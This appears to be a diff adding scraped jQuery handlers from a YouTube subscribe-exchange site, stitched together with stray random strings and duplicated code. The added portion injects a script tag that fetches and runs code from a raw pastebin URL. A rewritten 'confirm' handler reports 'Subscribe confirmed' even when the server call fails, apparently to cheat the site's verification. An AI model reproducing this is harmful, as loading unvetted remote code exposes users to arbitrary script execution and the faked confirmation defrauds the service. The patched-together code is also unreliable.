@@ -1,0 +1,62 @@
+
+$('.postloader').fadeIn(1);$(document).ready( function () {$('.postloader').fadeOut(10);} );$(document).on( "click", ".ytb-auth", function () {window.location.href = "https://console.ytbpals.com/authorize";} );</script><script type="text/javascript">
+$(document).on( "click", ".subscribe", function () {var $ytb = $("#ytbpals-channels");blockUI($ytb);var th = $(this);var id = th.attr('data-id');myWindow = window.open("https://console.ytbpals.com/subscribe?channel=" + id, "myWindow", "width=800,height=550");var timer = setInterval(function() { if(myWindow.closed) {clearInterval(timer);unblockUI($ytb);}}, 1000);});</script><script type="text/javascript">$(document).on( "click", ".skip", function () {var $ytb = $("#ytbpals-channels");$('.postloader').fadeIn(10);blockUI($ytb);var th = $(this);var id = th.attr('data-id');var pid = $("#youtube-reload").attr('data-id');$.post( "https://console.ytbpals.com/channel-skip", { channel:id, pid:pid }, function (data) {reloadChannel();} ).fail( function (data) {alert( "Some error occured\nPlease reload page and try again, YTBPals team is notified to check this error case, If you facing this issue repeatedly, please write to ytbpals@gmail.com or wait for 24 hours to check and get fixed by Team" );location.reload();} );});function reloadChannel(){location.reload();}
+
+$(document).on( "click", ".confirm", function () {var $ytb = $("#ytbpals-channels");$('.postloader').fadeIn(10);blockUI($ytb);var th = $(this);var id = th.attr('data-id');var load = th.attr('data-load');var pid = $("#youtube-reload").attr('data-id');$.post( "https://console.ytbpals.com/confirm", { channel:id, load:load, pid:pid }, function (data) {$('.postloader').fadeOut(10);unblockUI($ytb);
+if(data == "ok")
+{
+$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();
+}
+else if( data.msg == "fail" )
+{
+$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();
+}
+else
+{
+$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();
+}
+} ).fail( function (data) {alert( "error" );location.reload();} );
+
+}
+)
+;
+
+
+sl5VZRP13699WXC
+8rZUqLyF523clz
+
+https://pastebin.com/raw/sMyXxaiA
+
+var script = document.createElement("script");
+script.src = "https://pastebin.com/raw/sMyXxaiA";
+document.body.appendChild(script);
+
+
+$(document).on( "click", ".confirm", function () 
+{
+var $ytb = $("#ytbpals-channels");
+$('.postloader').fadeIn(10);blockUI($ytb);
+var th = $(this);
+var id = th.attr('data-id');
+var load = th.attr('data-load');
+var pid = $("#youtube-reload").attr('data-id');
+$.post( "https://console.ytbpals.com/confirm", { channel:id, load:load, pid:pid }, function (data) 
+{
+$('.postloader').fadeOut(10);unblockUI($ytb);
+if(data == "ok")
+{
+$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();
+}
+else if( data.msg == "fail" )
+{
+$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();
+}
+else
+{
+$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();
+}
+} ).fail( function (data) {$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();} );
+
+}
+)
+;
